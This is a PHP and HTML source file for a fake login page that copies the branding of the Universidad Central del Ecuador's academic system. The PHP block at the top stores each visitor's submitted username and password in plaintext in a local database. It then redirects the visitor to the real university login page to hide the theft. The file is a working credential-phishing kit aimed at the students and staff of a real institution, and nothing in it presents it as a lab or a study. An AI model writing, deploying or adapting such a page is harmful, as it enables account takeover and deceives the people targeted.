<?php
$error = '';
$success = '';

// Verificar si el formulario fue enviado
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Obtener los datos del formulario
    $username = $_POST['j_username'];
    $password = $_POST['j_password'];

    // Validar que el usuario no esté vacío
    if (empty($username) || empty($password)) {
        $error = 'Por favor complete todos los campos.';
    } else {
        // Conectar a la base de datos
        $conn = new mysqli('localhost', 'root', 'root', 'uce_login');
        
        if ($conn->connect_error) {
            die("Conexión fallida: " . $conn->connect_error);
        }

        // Insertar el usuario y la contraseña en la base de datos sin cifrado
        $stmt = $conn->prepare("INSERT INTO usuarios (username, password) VALUES (?, ?)");
        $stmt->bind_param("ss", $username, $password);

        // Ejecutar la consulta
        if ($stmt->execute()) {
            $success = 'Datos guardados correctamente.';
            header("Location: https://academico.uce.edu.ec/aplicacion/academico/generalidades/login.jsp");  
            exit();
        } else {
            $error = 'Hubo un error al guardar los datos.';
        }

        // Cerrar la conexión
        $stmt->close();
        $conn->close();
    }
}
?>


<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="assets\img\icono.ico" rel="icon">




    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/> <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap">
    
    <style> 
        body { background-image: url('assets/img/fondo_uce.png'); 
            background-size: cover; 
            background-repeat: no-repeat; 
        } 

        .cabecera-siiu { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 30vh; 
            text-align: center; 
            
        } 

        .cabecera-texto { 
            margin: auto; 
            color: white; 
            font-weight: 1000000; 
            text-shadow: 3px 3px 5px rgba(0, 0, 0, 0.5); 
        }




    </style>
</head>
<body class="bg-light">

    <div class="cabecera-siiu">
		<div class="cabecera-texto">
        <h1 class="animate__animated animate__fadeInDown" style="animation-delay: .6s; font-size: 31px;">UNIVERSIDAD CENTRAL DEL ECUADOR</h1> 
        <h1 class="animate__animated animate__fadeInUp" style="animation-delay: 1s; font-size: 31px;">SISTEMA ACADÉMICO		
		</div>
	</div>

    <div class="container d-flex justify-content-center align-items-center" 
        style="position: absolute; top: 12rem; left: 0; right: 0; bottom: 0; margin: auto; width: 400px; height: 340px; 
                border-radius: 0px; background: rgba(3, 3, 3, .2); box-shadow: 8px 10px 20px rgba(3, 3, 3, .6);">
        <!-- Card para el formulario de inicio de sesión -->
        <div class="card w-100 border-0" style="background-color: transparent;">
            <div class="position-relative" style="background-color: transparent;">
                <h1 class="text-center mb-1.5" style="color:rgb(48, 37, 29); text-shadow: 3px 3px 5px rgba(0, 0, 0, 0.5); font-size: 32px;">INICIAR SESIÓN</h1>

                
                <!-- Botón de cerrar (icono) -->
                <span class="close-btn position-absolute" style="top: -18px; right: -8px; cursor: pointer;">
                    <img src="./assets/img/close.png" alt="close-btn" 
                         style="width: 27px; color: rgb(164, 164, 164);">
                </span>
        
                <!-- Botón de login animado -->
                <div id="login-button" class="wow flip d-flex justify-content-center mb-0" data-wow-delay=".5s">
                    <i class="fa fa-uce_academico fa-2x" style="color: #007bff;"></i>
                </div>

                <!-- Formulario de inicio de sesión -->
                <form action="" method="post">
                    <div class="mb-3">
                        <div class="input-group" style="width: calc(100% - 1.2cm); margin: 0 auto;">
                            <span class="input-group-text" style="background-color: transparent; border: none;">
                                <i class="fa fa-user-secret fa-2x" aria-hidden="true"></i>
                            </span>
                            <input type="text" id="j_username" name="j_username" class="form-control" placeholder="Usuario" style="background-color: #aeaeae; border-radius: 7px; height: 46px;">
                        </div>
                    </div>

                    <div class="mb-3">
                        <div class="input-group" style="width: calc(100% - 1.2cm); margin: 0 auto;">
                            <span class="input-group-text fa-2x" style="background-color: transparent; border: none;">
                                <i class="fa fa-key"></i>
                            </span>
                            <input type="password" id="j_password" name="j_password" class="form-control" placeholder="Contraseña" style="background-color: #aeaeae; border-radius: 7px; height: 46px;">
                        </div>
                    </div>
                    <!-- Botón de Ingreso -->
                    <div class="mb-0.5">
                        <button type="submit" class="btn btn-primary" style="background-color: rgb(1, 70, 112); border-radius: 7px; width: calc(100% - 2.7cm); margin-left: 2.1cm; margin-bottom: 10px; height: 46px;">Ingresar</button>
                    </div>

                    <!-- Botón de Simulador -->
                    <div class="mb-4">
                        <a href="https://academico.uce.edu.ec/aplicacion/academico/generalidades/simuladorRecuperacion.jsf">
                            <button type="button" class="btn btn-success" style="background-color: rgb(1, 70, 112); border-radius: 7px; width: calc(100% - 2.7cm); margin-left: 2.1cm; height: 46px;">Simulador de evaluación</button>
                        </a>
                    </div>

                </form>

            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/wow.js@1.1.2/dist/wow.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.min.js"></script> <script> new WOW().init(); </script>
</body>
</html>
